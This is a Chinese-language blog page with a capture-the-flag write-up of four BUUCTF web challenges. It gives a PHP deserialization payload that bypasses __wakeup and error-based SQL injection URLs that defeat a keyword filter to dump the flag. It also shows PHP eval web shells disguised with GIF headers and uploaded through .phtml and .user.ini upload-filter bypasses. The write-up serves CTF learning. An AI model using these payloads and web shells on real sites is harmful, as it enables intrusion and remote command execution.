@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="obsem">
+
+
+
+<meta name="description" content="PHP题目提示有备份文件，用扫描工具就能扫出来，得到源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）">
+<meta property="og:url" content="http://yoursite.com/2020/10/03/BUUCTFweb部分解题思路2/index.html">
+<meta property="og:site_name" content="obsetear">
+<meta property="og:description" content="PHP题目提示有备份文件，用扫描工具就能扫出来，得到源码">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200923202129201.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200923202846186.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200923203125490.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200923203158764.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200923203456516.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200923203724729.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200928192344550.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200928192339756.jpg#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201004174240352.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:updated_time" content="2021-02-09T07:46:37.713Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）">
+<meta name="twitter:description" content="PHP题目提示有备份文件，用扫描工具就能扫出来，得到源码">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200923202129201.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="obsetear" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn） | obsetear</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">obsem</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">obsem</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">obsem</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-BUUCTFweb部分解题思路2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/03/BUUCTFweb部分解题思路2/" class="article-date">
+      <time datetime="2020-10-02T16:00:00.000Z" itemprop="datePublished">2020-10-03</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>题目提示有备份文件，用扫描工具就能扫出来，得到源码</p>
+<a id="more"></a>
+<p>class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &apos;nonono&apos;;</span><br><span class="line">    private $password = &apos;yesyes&apos;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">            die(); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;class.php&apos;;</span><br><span class="line">$select = $_GET[&apos;select&apos;];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据源码，只要满足username=admin，password=100且绕过<code>__wakeup()</code>方法就可以得到flag</p>
+<p>先序列化name类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &apos;admin&apos;;</span><br><span class="line">    private $password = &apos;100&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$name=new Name();</span><br><span class="line">echo urlencode(serialize($name));</span><br><span class="line">//这里有个小坑，如果不加urlencode有些不可打印字符会显示不出来</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;//(未经过urlencode编码的payload)</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过<code>__wakeup()</code>方法：</strong></p>
+<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过<code>__wakeup()</code>方法的执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<h4 id="Babysql"><a href="#Babysql" class="headerlink" title="Babysql"></a>Babysql</h4><p>sql注入，经过测试，过滤了很多关键字，不过双写就可以轻松绕过</p>
+<p>先进入check界面，判断出是单引号闭合<br><img src="https://img-blog.csdnimg.cn/20200923202129201.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后我这里用的报错注入</p>
+<p>爆库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27 ununionion selselectect+updatexml(&apos;1&apos;,concat(&apos;~&apos;,(selselectect database())),&apos;1&apos;)%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200923202846186.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27 ununionion selselectect+updatexml(&apos;1&apos;,concat(&apos;~&apos;,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&apos;geek&apos; )),&apos;1&apos;)%23&amp;password=password</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200923203125490.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27 ununionion selselectect+updatexml(&apos;1&apos;,concat(&apos;~&apos;,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&apos;b4bsql&apos; )),&apos;1&apos;)%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200923203158764.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆值，flag在password里的id=8时对应的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27 ununionion selselectect+updatexml(&apos;1&apos;,concat(&apos;~&apos;,(selselectect passwoorrd frfromom b4bsql limit 7,1 )),&apos;1&apos;)%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200923203456516.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>但是这里由于回显限长，所以没有显示完整的flag，可以right函数截取后半部分然后显示出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27 uniunionon seselectlect updatexml(&apos;1&apos;,concat(&apos;~&apos;,right((selselectect passwoorrd frfromom b4bsql limit 7,1),20)),&apos;1&apos;)%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200923203724729.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><p>文件上传，不仅检测内容，而且检测后缀</p>
+<p>文件头必须<code>gif</code>的文件头，而且内容中还不能有<code>&lt;?</code>，后缀php,php3,php4,php5,html,phtml,pht中只有phtml上传成功且可用，html和pht虽然能上传成功但不可用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&quot;cmd&quot;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>GIF89a</code>是gif的文件头，这题只能上传gif文件，所以这里只能用gif的文件头</p>
+<p>然后再抓包修改文件后缀为.phtml</p>
+<p><img src="https://img-blog.csdnimg.cn/20200928192344550.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200928192339756.jpg#pic_center" alt="在这里插入图片描述"><br>上传的文件在/upload目录下，最后用蚁剑一连就完事了</p>
+<h4 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h4><p>这道题主要涉及了利用.user.ini上传\隐藏后门的知识<br>使用的条件如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、服务器脚本语言为PHP</span><br><span class="line">2、服务器使用CGI／FastCGI模式</span><br><span class="line">3、上传目录下要有可执行的php文件</span><br></pre></td></tr></table></figure>
+
+<p>先上传.user.ini绕过黑名单检验</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  //绕过exif_imagetype()</span><br><span class="line">auto_prepend_file=a.gif //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</span><br><span class="line">auto_append_file=a.  //解析后进行包含</span><br></pre></td></tr></table></figure>
+
+<p>再上传a.gif</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&apos;cmd&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这种上传姿势所需要的前提条件是含有.user.ini的文件夹下需要有正常的php文件，再在.user.ini文件里包含我们上传的图片马，最后访问正常的php文件，php文件就会包含并执行我们的图片马<br><img src="https://img-blog.csdnimg.cn/20201004174240352.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>最后用蚁剑一连又完事了</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/10/03/BUUCTFweb部分解题思路2/">BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
+        <p><span>发布时间:</span>2020-10-03, 00:00:00</p>
+        <p><span>最后更新:</span>2021-02-09, 15:46:37</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/10/03/BUUCTFweb部分解题思路2/" title="BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）">http://yoursite.com/2020/10/03/BUUCTFweb部分解题思路2/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/10/03/BUUCTFweb部分解题思路2/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/10/04/linux基础知识（笔记）/">
+                    Linux基础（笔记）
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/09/15/BUUCTF部分web题解/">
+                    BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP"><span class="toc-number">1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Babysql"><span class="toc-number">2.</span> <span class="toc-text">Babysql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upload"><span class="toc-number">3.</span> <span class="toc-text">Upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CheckIn"><span class="toc-number">4.</span> <span class="toc-text">CheckIn</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/10/04/linux基础知识（笔记）/" title="上一篇: Linux基础（笔记）">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/09/15/BUUCTF部分web题解/" title="下一篇: BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/11/21/从文件上传到浅谈.htaccess文件的作用/">从文件上传到浅谈.htaccess文件的作用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/19/记一次简单的渗透练习/">记一次简单的渗透练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/10/python 正则表达式小结（笔记）/">python正则表达式小结（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/08/upload-labs通关总结/">upload-labs通关小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/04/linux基础知识（笔记）/">Linux基础（笔记）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/03/BUUCTFweb部分解题思路2/">BUUCTFweb部分解题思路（PHP、Babysql、Upload、CheckIn）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/15/BUUCTF部分web题解/">BUUCTF部分web题解（easysql，easy_tornado，Ping Ping Ping）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/26/内网渗透之Linux提权姿势/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/16/内网渗透之windows提权的几种姿势/">windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/06/内网渗透之免杀/">免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/内网渗透之windows基础/">Windows基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">浅谈XXE漏洞：从XML到文件读取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/SSRF漏洞/">SSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/23/csrf漏洞小结/">CSRF漏洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/Mysql报错函数小结/">Mysql报错函数小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/10/文件包含漏洞小结/">浅谈文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/浅谈php一句话木马/">浅谈一句话木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/23/攻防世界web系列/">攻防世界web系列</a></li><li 